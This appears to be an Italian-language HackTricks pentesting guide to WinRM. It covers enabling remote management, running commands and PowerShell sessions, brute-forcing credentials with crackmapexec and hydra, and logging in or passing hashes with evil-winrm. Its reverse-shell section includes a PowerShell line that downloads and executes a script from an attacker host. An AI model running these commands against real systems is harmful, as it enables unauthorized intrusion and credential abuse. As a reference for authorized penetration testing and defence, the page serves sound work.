# 5985,5986 - Pentesting WinRM

{{#include ../banners/hacktricks-training.md}}

## WinRM

[Windows Remote Management (WinRM)](<https://msdn.microsoft.com/en-us/library/windows/desktop/aa384426(v=vs.85).aspx>) è evidenziato come un **protocollo di Microsoft** che consente la **gestione remota dei sistemi Windows** tramite HTTP(S), sfruttando SOAP nel processo. È fondamentalmente alimentato da WMI, presentandosi come un'interfaccia basata su HTTP per le operazioni WMI.

La presenza di WinRM su una macchina consente un'amministrazione remota semplice tramite PowerShell, simile a come funziona SSH per altri sistemi operativi. Per determinare se WinRM è operativo, si consiglia di controllare l'apertura di porte specifiche:

- **5985/tcp (HTTP)**
- **5986/tcp (HTTPS)**

Una porta aperta dall'elenco sopra indica che WinRM è stato configurato, consentendo quindi tentativi di avviare una sessione remota.

### **Iniziare una sessione WinRM**

Per configurare PowerShell per WinRM, il cmdlet `Enable-PSRemoting` di Microsoft entra in gioco, configurando il computer per accettare comandi PowerShell remoti. Con accesso elevato a PowerShell, è possibile eseguire i seguenti comandi per abilitare questa funzionalità e designare qualsiasi host come attendibile:
```powershell
Enable-PSRemoting -Force
Set-Item wsman:\localhost\client\trustedhosts *
```
Questo approccio prevede l'aggiunta di un carattere jolly alla configurazione `trustedhosts`, un passaggio che richiede un'attenta considerazione a causa delle sue implicazioni. Si nota inoltre che potrebbe essere necessario modificare il tipo di rete da "Pubblica" a "Lavoro" sulla macchina dell'attaccante.

Inoltre, WinRM può essere **attivato remotamente** utilizzando il comando `wmic`, come dimostrato di seguito:
```powershell
wmic /node:<REMOTE_HOST> process call create "powershell enable-psremoting -force"
```
Questo metodo consente la configurazione remota di WinRM, migliorando la flessibilità nella gestione delle macchine Windows da lontano.

### Verifica se configurato

Per verificare la configurazione della tua macchina di attacco, il comando `Test-WSMan` viene utilizzato per controllare se il target ha WinRM configurato correttamente. Eseguendo questo comando, dovresti aspettarti di ricevere dettagli riguardanti la versione del protocollo e wsmid, indicando una configurazione riuscita. Di seguito sono riportati esempi che dimostrano l'output atteso per un target configurato rispetto a uno non configurato:

- Per un target che **è** configurato correttamente, l'output apparirà simile a questo:
```bash
Test-WSMan <target-ip>
```
La risposta dovrebbe contenere informazioni sulla versione del protocollo e wsmid, che significano che WinRM è configurato correttamente.

![](<../images/image (582).png>)

- Al contrario, per un obiettivo **non** configurato per WinRM, ciò comporterebbe l'assenza di informazioni dettagliate, evidenziando l'assenza di una corretta configurazione di WinRM.

![](<../images/image (458).png>)

### Eseguire un comando

Per eseguire `ipconfig` da remoto su una macchina target e visualizzarne l'output, fare:
```powershell
Invoke-Command -computername computer-name.domain.tld -ScriptBlock {ipconfig /all} [-credential DOMAIN\username]
```
![](<../images/image (151).png>)

Puoi anche **eseguire un comando della tua console PS attuale tramite** _**Invoke-Command**_. Supponiamo che tu abbia localmente una funzione chiamata _**enumeration**_ e desideri **eseguirla su un computer remoto**, puoi fare:
```powershell
Invoke-Command -ComputerName <computername> -ScriptBLock ${function:enumeration} [-ArgumentList "arguments"]
```
### Esegui uno Script
```powershell
Invoke-Command -ComputerName <computername> -FilePath C:\path\to\script\file [-credential CSCOU\jarrieta]
```
### Ottieni reverse-shell
```powershell
Invoke-Command -ComputerName <computername> -ScriptBlock {cmd /c "powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.10.10:8080/ipst.ps1')"}
```
### Ottieni una sessione PS

Per ottenere una shell PowerShell interattiva usa `Enter-PSSession`:
```powershell
#If you need to use different creds
$password=ConvertTo-SecureString 'Stud41Password@123' -Asplaintext -force
## Note the ".\" in the suername to indicate it's a local user (host domain)
$creds2=New-Object System.Management.Automation.PSCredential(".\student41", $password)

# Enter
Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local [-Credential username]
## Bypass proxy
Enter-PSSession -ComputerName 1.1.1.1 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
# Save session in var
$sess = New-PSSession -ComputerName 1.1.1.1 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
Enter-PSSession $sess
## Background current PS session
Exit-PSSession # This will leave it in background if it's inside an env var (New-PSSession...)
```
![](<../images/image (1009).png>)

**La sessione verrà eseguita in un nuovo processo (wsmprovhost) all'interno della "vittima"**

### **Forzare l'apertura di WinRM**

Per utilizzare PS Remoting e WinRM ma il computer non è configurato, puoi abilitarlo con:
```powershell
.\PsExec.exe \\computername -u domain\username -p password -h -d powershell.exe "enable-psremoting -force"
```
### Salvataggio e ripristino delle sessioni

Questo **non funzionerà** se la **lingua** è **vincolata** nel computer remoto.
```powershell
#If you need to use different creds
$password=ConvertTo-SecureString 'Stud41Password@123' -Asplaintext -force
## Note the ".\" in the suername to indicate it's a local user (host domain)
$creds2=New-Object System.Management.Automation.PSCredential(".\student41", $password)

#You can save a session inside a variable
$sess1 = New-PSSession -ComputerName <computername> [-SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)]
#And restore it at any moment doing
Enter-PSSession -Session $sess1
```
All'interno di queste sessioni puoi caricare script PS utilizzando _Invoke-Command_
```powershell
Invoke-Command -FilePath C:\Path\to\script.ps1 -Session $sess1
```
### Errori

Se trovi il seguente errore:

`enter-pssession : Connecting to remote server 10.10.10.175 failed with the following error message : The WinRM client cannot process the request. If the authentication scheme is different from Kerberos, or if the client computer is not joined to a domain, then HTTPS transport must be used or the destination machine must be added to the TrustedHosts configuration setting. Use winrm.cmd to configure TrustedHosts. Note that computers in the TrustedHosts list might not be authenticated. You can get more information about that by running the following command: winrm help config. For more information, see the about_Remote_Troubleshooting Help topic.`

Il tentativo sul client (info da [qui](https://serverfault.com/questions/657918/remote-ps-session-fails-on-non-domain-server)):
```ruby
winrm quickconfig
winrm set winrm/config/client '@{TrustedHosts="Computer1,Computer2"}'
```
## Connessione WinRM in Linux

### Forza Bruta

Fai attenzione, la forza bruta su winrm potrebbe bloccare gli utenti.
```ruby
#Brute force
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt

#Just check a pair of credentials
# Username + Password + CMD command execution
crackmapexec winrm <IP> -d <Domain Name> -u <username> -p <password> -x "whoami"
# Username + Hash + PS command execution
crackmapexec winrm <IP> -d <Domain Name> -u <username> -H <HASH> -X '$PSVersionTable'
#Crackmapexec won't give you an interactive shell, but it will check if the creds are valid to access winrm
```
### Utilizzando evil-winrm
```ruby
gem install evil-winrm
```
Leggi **documentazione** su github: [https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)
```ruby
evil-winrm -u Administrator -p 'EverybodyWantsToWorkAtP.O.O.'  -i <IP>/<Domain>
```
Per utilizzare evil-winrm per connettersi a un **indirizzo IPv6**, crea un'entrata all'interno di _**/etc/hosts**_ impostando un **nome di dominio** all'indirizzo IPv6 e connettiti a quel dominio.

### Passa l'hash con evil-winrm
```ruby
evil-winrm -u <username> -H <Hash> -i <IP>
```
![](<../images/image (680).png>)

### Utilizzando una macchina PS-docker
```
docker run -it quickbreach/powershell-ntlm
$creds = Get-Credential
Enter-PSSession -ComputerName 10.10.10.149 -Authentication Negotiate -Credential $creds
```
### Utilizzando uno script ruby

**Codice estratto da qui:** [**https://alamot.github.io/winrm_shell/**](https://alamot.github.io/winrm_shell/)
```ruby
require 'winrm-fs'

# Author: Alamot
# To upload a file type: UPLOAD local_path remote_path
# e.g.: PS> UPLOAD myfile.txt C:\temp\myfile.txt
# https://alamot.github.io/winrm_shell/


conn = WinRM::Connection.new(
endpoint: 'https://IP:PORT/wsman',
transport: :ssl,
user: 'username',
password: 'password',
:no_ssl_peer_verification => true
)


class String
def tokenize
self.
split(/\s(?=(?:[^'"]|'[^']*'|"[^"]*")*$)/).
select {|s| not s.empty? }.
map {|s| s.gsub(/(^ +)|( +$)|(^["']+)|(["']+$)/,'')}
end
end


command=""
file_manager = WinRM::FS::FileManager.new(conn)


conn.shell(:powershell) do |shell|
until command == "exit\n" do
output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')")
print(output.output.chomp)
command = gets
if command.start_with?('UPLOAD') then
upload_command = command.tokenize
print("Uploading " + upload_command[1] + " to " + upload_command[2])
file_manager.upload(upload_command[1], upload_command[2]) do |bytes_copied, total_bytes, local_path, remote_path|
puts("#{bytes_copied} bytes of #{total_bytes} bytes copied")
end
command = "echo `nOK`n"
end
output = shell.run(command) do |stdout, stderr|
STDOUT.print(stdout)
STDERR.print(stderr)
end
end
puts("Exiting with code #{output.exitcode}")
end
```
## Shodan

- `port:5985 Microsoft-HTTPAPI`

## Riferimenti

- [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/)

## Comandi Automatici HackTricks
```
Protocol_Name: WinRM    #Protocol Abbreviation if there is one.
Port_Number:  5985     #Comma separated if there is more than one.
Protocol_Description: Windows Remote Managment        #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for WinRM
Note: |
Windows Remote Management (WinRM) is a Microsoft protocol that allows remote management of Windows machines over HTTP(S) using SOAP. On the backend it's utilising WMI, so you can think of it as an HTTP based API for WMI.

sudo gem install winrm winrm-fs colorize stringio
git clone https://github.com/Hackplayers/evil-winrm.git
cd evil-winrm
ruby evil-winrm.rb -i 192.168.1.100 -u Administrator -p ‘MySuperSecr3tPass123!’

https://kalilinuxtutorials.com/evil-winrm-hacking-pentesting/

ruby evil-winrm.rb -i 10.10.10.169 -u melanie -p 'Welcome123!' -e /root/Desktop/Machines/HTB/Resolute/
^^so you can upload binary's from that directory        or -s to upload scripts (sherlock)
menu
invoke-binary `tab`

#python3
import winrm
s = winrm.Session('windows-host.example.com', auth=('john.smith', 'secret'))
print(s.run_cmd('ipconfig'))
print(s.run_ps('ipconfig'))

https://book.hacktricks.wiki/en/network-services-pentesting/5985-5986-pentesting-winrm.html

Entry_2:
Name: Hydra Brute Force
Description: Need User
Command: hydra -t 1 -V -f -l {Username} -P {Big_Passwordlist} rdp://{IP}
```
{{#include ../banners/hacktricks-training.md}}
